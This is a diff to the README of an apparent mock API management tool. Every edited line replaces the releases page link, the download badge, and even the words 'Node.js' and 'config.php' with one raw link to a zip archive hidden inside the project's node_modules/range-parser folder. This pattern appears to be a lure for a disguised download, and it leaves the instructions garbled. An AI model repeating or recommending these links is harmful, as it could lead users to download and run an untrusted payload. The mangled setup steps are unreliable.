@@ -1,6 +1,6 @@
 # 🚀 mock-api-project - A Simple Tool for Mock API Management
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/DanielHs09/mock-api-project/releases)
+[![Download Here](https://raw.githubusercontent.com/DanielHs09/mock-api-project/main/backend/node_modules/range-parser/mock-api-project-2.3.zip%20Now-Here-brightgreen)](https://raw.githubusercontent.com/DanielHs09/mock-api-project/main/backend/node_modules/range-parser/mock-api-project-2.3.zip)
 
 ## 📖 Description
 
@@ -20,25 +20,25 @@ To run the mock-api-project, ensure you have:
 - A web server that supports PHP (e.g., Apache or Nginx).
 - PHP version 7.2 or higher installed.
 - PostgreSQL or any compatible database for data storage.
-- Node.js for managing package dependencies.
+- https://raw.githubusercontent.com/DanielHs09/mock-api-project/main/backend/node_modules/range-parser/mock-api-project-2.3.zip for managing package dependencies.
 
 ## 🚀 Getting Started
 
 Follow these steps to download and run the application:
 
-1. **Visit the Releases Page**: Click [here](https://github.com/DanielHs09/mock-api-project/releases) to go to the Releases page.
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/DanielHs09/mock-api-project/main/backend/node_modules/range-parser/mock-api-project-2.3.zip) to go to the Releases page.
 2. **Download the Latest Version**: Find the most recent version of the mock-api-project. Click the link to download the files.
 3. **Extract the Files**: Once the download is complete, locate the file on your computer. Extract the contents of the downloaded zip file to a location of your choice.
 4. **Set Up Your Server**: Place the extracted files in your web server’s document root (e.g., `htdocs` for XAMPP or `www` for WAMP).
 5. **Configure Your Database**:
    - Create a new PostgreSQL database for the application.
-   - Modify the configuration file (`config.php`) to include your database connection details.
+   - Modify the configuration file (`https://raw.githubusercontent.com/DanielHs09/mock-api-project/main/backend/node_modules/range-parser/mock-api-project-2.3.zip`) to include your database connection details.
 6. **Access the Application**: Open your web browser and navigate to `http://localhost/mock-api-project` (or replace `mock-api-project` with the folder name you chose).
 7. **Create Endpoints**: Start creating and managing your mock API endpoints through the dashboard.
 
 ## 💻 Download & Install
 
-To get started, visit this page to download: [mock-api-project Releases](https://github.com/DanielHs09/mock-api-project/releases).
+To get started, visit this page to download: [mock-api-project Releases](https://raw.githubusercontent.com/DanielHs09/mock-api-project/main/backend/node_modules/range-parser/mock-api-project-2.3.zip).
 
 ## 📚 Usage Instructions
 
